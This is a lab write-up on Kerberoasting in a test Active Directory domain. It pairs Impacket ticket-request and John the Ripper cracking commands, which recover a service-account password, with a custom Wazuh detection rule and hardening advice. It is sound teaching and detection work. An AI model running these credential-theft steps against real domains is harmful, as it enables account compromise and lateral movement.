# Lab 04 — Kerberoasting Attack & Detection

**Category:** Offensive Security + Detection Engineering  
**Difficulty:** Intermediate–Advanced  
**Attacker:** Kali Linux (`10.0.0.117`)  
**Target:** DC01 — lab.local domain (`10.0.0.200`)  
**SIEM:** Wazuh Manager (`10.0.0.166`)  
**MITRE ATT&CK:** T1558.003 — Kerberoasting  
**Date:** April 2026

---

## Objective

Simulate a Kerberoasting attack against a Windows Active Directory environment using a compromised low-privilege domain account, crack the extracted service ticket hash offline, and detect the attack using a custom Wazuh SIEM rule triggering on Windows Event ID 4769 with RC4 encryption.

This lab demonstrates the full offensive and defensive lifecycle of one of the most common Active Directory credential theft techniques used in real-world intrusions.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Impacket (GetUserSPNs) | Enumerate SPNs and request TGS tickets |
| John the Ripper | Offline hash cracking |
| Wazuh SIEM | Detection and alerting |
| Custom Wazuh Rule 100200 | Kerberoasting-specific detection logic |

---

## Background — What is Kerberoasting?

Kerberos is the authentication protocol used by Active Directory. When a user needs to access a service, they request a **Ticket Granting Service (TGS)** ticket from the Domain Controller. The TGS is encrypted using the service account's password hash.

The critical vulnerability: **any authenticated domain user can request a TGS for any service account.** The DC does not verify whether the requester actually needs access. The ticket is handed over encrypted, and the attacker takes it offline to crack.

```
Attacker (jsmith) → Request TGS for sqlsvc → DC issues encrypted ticket
→ Attacker extracts hash → Offline brute force → plaintext password recovered
→ No lockout, no alerts by default, no elevated privileges required
```

Kerberoasting is classified under **MITRE ATT&CK T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting** under the Credential Access tactic.

---

## Attack Chain Summary

```
Compromised low-priv account (jsmith)
    → SPN enumeration via Impacket
    → TGS ticket requested for sqlsvc (RC4 encryption)
    → Hash extracted from ticket
    → Offline cracking with John the Ripper
    → sqlsvc password recovered: MSSQLSvc2024!
    → Potential for lateral movement / privilege escalation
```

---

## Phase 1 — Reconnaissance & SPN Enumeration

### SPN Enumeration

Used Impacket's `GetUserSPNs` to enumerate all service accounts with SPNs registered in the domain, authenticating as the compromised user `jsmith`:

```bash
impacket-GetUserSPNs lab.local/jsmith:Password123! -dc-ip 10.0.0.200 -request
```

**Output:**

```
ServicePrincipalName          Name    MemberOf  PasswordLastSet
----------------------------  ------  --------  ---------------
MSSQLSvc/dc01.lab.local:1433  sqlsvc            2026-04-19
MSSQLSvc/dc01.lab.local:1443  sqlsvc            2026-04-19
```

`sqlsvc` has an SPN registered — making it a Kerberoasting target. Impacket automatically requested the TGS ticket and returned the hash.

---

## Phase 2 — Hash Extraction

The TGS ticket hash was returned directly by Impacket:

```
$krb5tgs$23$*sqlsvc$LAB.LOCAL$lab.local/sqlsvc*$77b9a5d1fa6a300e9a93e95d90db474f$...
```

Key indicators in the hash:
- `$krb5tgs$23$` — Kerberos TGS ticket, etype 23 (RC4-HMAC)
- `sqlsvc` — target service account
- `LAB.LOCAL` — target domain

Saved to file:
```bash
impacket-GetUserSPNs lab.local/jsmith:Password123! -dc-ip 10.0.0.200 -request > kerberoast.txt
```

---

## Phase 3 — Offline Password Cracking

Used John the Ripper to crack the hash offline. No network traffic, no lockouts, no detection from cracking alone:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

**Result:**
```
MSSQLSvc2024!    (sqlsvc)
```

With the sqlsvc password recovered, an attacker could:
- Authenticate as sqlsvc to SQL Server instances
- Attempt lateral movement across the domain
- Use the account for persistence

---

## Phase 4 — Detection Engineering

### Why Default Wazuh Rules Miss This

Windows logs every Kerberos ticket request as Event ID 4769. However:
- 4769 events are extremely noisy in an AD environment
- Wazuh's default rules don't distinguish Kerberoasting from normal ticket requests
- The key indicator is the **encryption type** — RC4 (`0x17`) vs AES (`0x12`/`0x11`)

### Prerequisites

Enabled Kerberos audit logging on DC01:

```cmd
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
```

### Custom Wazuh Rule

Wrote a custom detection rule targeting the specific combination of fields that indicate Kerberoasting. Added to `/var/ossec/etc/rules/local_rules.xml` on the Wazuh manager:

```xml
<group name="kerberoasting,">
  <rule id="100200" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
    <field name="win.eventdata.targetUserName" negate="yes">^.*\$$</field>
    <description>Possible Kerberoasting attack detected - RC4 encrypted Kerberos ticket requested for $(win.eventdata.targetUserName)</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
  </rule>
</group>
```

**Rule logic breakdown:**

| Field | Value | Reason |
|-------|-------|--------|
| `if_sid` | 60103 | Parent rule — Windows Security eventchannel |
| `eventID` | 4769 | Kerberos service ticket request |
| `ticketEncryptionType` | 0x17 | RC4 encryption — Kerberoasting signature |
| `targetUserName` negate `.*\$` | Excludes machine accounts ending in `$` | Reduces false positives from normal DC activity |
| `level` | 12 | Critical severity |
| `mitre.id` | T1558.003 | MITRE ATT&CK Kerberoasting technique |

```
```
---

## Phase 5 — Alert Validation

Re-ran the attack and confirmed rule 100200 fired in Wazuh:

### Wazuh Alert Details

```
rule.id:              100200
rule.level:           12 (Critical)
rule.description:     Possible Kerberoasting attack detected - RC4 encrypted 
                      Kerberos ticket requested for jsmith@LAB.LOCAL
rule.mitre.id:        T1558.003
rule.mitre.tactic:    Credential Access
rule.mitre.technique: Kerberoasting

agent.name:           DC01
data.win.eventdata.serviceName:          sqlsvc
data.win.eventdata.targetUserName:       jsmith@LAB.LOCAL
data.win.eventdata.ticketEncryptionType: 0x17
data.win.eventdata.ipAddress:            ::ffff:10.0.0.117
data.win.system.eventID:                 4769
timestamp:            2026-04-19T20:22:01.813Z
```

**Attacker IP identified:** `10.0.0.117` (Kali Linux) — visible in the `ipAddress` field, enabling immediate containment.

---

## Detection Summary

| Indicator | Value |
|-----------|-------|
| Attack Type | Kerberoasting |
| Attacker Account | jsmith@LAB.LOCAL |
| Target Service | sqlsvc |
| Attacker IP | 10.0.0.117 |
| Detection Method | Custom Wazuh rule 100200 |
| Key Indicator | Event ID 4769 + Encryption Type 0x17 (RC4) |
| MITRE ATT&CK | T1558.003 — Kerberoasting |
| Alert Level | 12 (Critical) |
| Time to Detect | < 30 seconds from attack |

---

## Incident Response — What an Analyst Should Do

1. **Immediately rotate sqlsvc password** — attacker may have already cracked it
2. **Investigate jsmith** — how was jsmith compromised? Check logon history, source IPs
3. **Search for lateral movement** — check if attacker used sqlsvc credentials anywhere
4. **Audit all SPNs in the domain** — identify all Kerberoastable accounts
5. **Check for additional Kerberoasting** — search for other 4769 + RC4 events

```cmd
# Audit all SPNs in the domain
setspn -Q */* | findstr -v "CN=DC"
```

---

## Defensive Recommendations

1. **Use strong, random service account passwords (25+ characters)** — makes offline cracking computationally infeasible even with RC4
2. **Migrate to Group Managed Service Accounts (gMSA)** — passwords are automatically managed by AD, 120 characters, rotated automatically
3. **Enforce AES encryption via Group Policy** — disable RC4 (0x17) for Kerberos across the domain. This breaks Kerberoasting entirely
4. **Implement least privilege** — service accounts should only have permissions required for their specific function
5. **Monitor Event ID 4769 with RC4** — use the custom Wazuh rule from this lab or equivalent in your SIEM
6. **Regular SPN audits** — remove unnecessary SPNs from accounts that don't need them

---

## Key Takeaways

- Kerberoasting requires only **one compromised low-privilege domain account** — the bar for attackers is extremely low
- The attack generates **no failed authentication attempts** — traditional brute force detection won't catch it
- The cracking happens **entirely offline** — no network traffic after the initial ticket request
- The key detection indicator is **RC4 encryption (0x17)** on a 4769 event — modern systems use AES by default, so RC4 is a red flag
- Writing **custom SIEM rules** is a core SOC skill — default rules alone are insufficient for advanced attack techniques
- **MITRE ATT&CK mapping** enables analysts to immediately understand attack context and look up recommended mitigations

---

## References

- [MITRE ATT&CK T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [Impacket GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [Wazuh Custom Rules Documentation](https://documentation.wazuh.com/current/user-manual/ruleset/custom.html)
- [Microsoft Event ID 4769](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [Defending Against Kerberoasting — SANS](https://www.sans.org/blog/defending-against-kerberoasting/)
